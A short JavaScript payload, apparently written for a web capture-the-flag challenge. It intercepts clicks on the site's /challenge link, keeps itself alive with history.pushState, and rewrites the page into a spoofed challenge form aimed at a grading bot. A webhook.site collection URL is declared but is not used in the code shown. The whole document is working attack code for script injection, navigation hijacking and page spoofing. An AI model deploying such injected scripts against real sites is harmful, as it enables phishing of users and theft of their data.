
(() => {
    const webhook =
        'https://webhook.site/67909b69-79e2-46cd-8eb1-bf3cbfddac04';

    const link = document.querySelector('a[href="/challenge"]');
    if (!link) return;

    link.addEventListener('click', e => {
        e.preventDefault();
        e.stopImmediatePropagation();

        // Keep our JavaScript context alive
        history.pushState({}, '', '/challenge');

        // Create the form expected by bot.py
        document.querySelector('.content').innerHTML = `
            <html><head><title>Boku no Firebird CTF</title><link rel=stylesheet type=text/css href=/static/css/styles.css><body><script src='https://cdn.jsdelivr.net/npm/jquery@3.6.4/src/core.min.js'></script><div class=nav-bar><div class=nav-left><a href=/><img src=/static/svg/chart.svg /> Scoreboard</a><a href=/profile><img src=/static/svg/profile.svg /> Profile</a><a href=/challenge><img src=/static/svg/cube.svg /> Challenge</a></div><div class=nav-right><span class=welcome-text>Welcome, <b>Firebird</b></span><a href=/logout><img src=/static/svg/logout.svg /> Logout</a></div></div><div class=content><h2>Challenge</h2>
<fieldset><h3>Sanity Check</h3>
<p>Welcome! Flag is <!-- not --> <code oncopy=location=`https://www.youtube.com/watch?v=0f3RrvC-zGI`>firebird{B0ku_no_YAkl7OrI_CHaN}</code>
<form method=post>
<p>Flag: <input name=flag autocomplete=off placeholder="firebird{...}">
<input type=hidden name=id value=1>
<input type=submit class=submit-flag>
</form>
</fieldset>
<br><br>
<fieldset><h3>Lay's gender</h3>
<p>If you lay, then do you lay? If you do not lay, then do you not lay?
<form method=post>
<div class=solved>Solved</div>
</form>
</fieldset>

        `;
    }, true);
})();
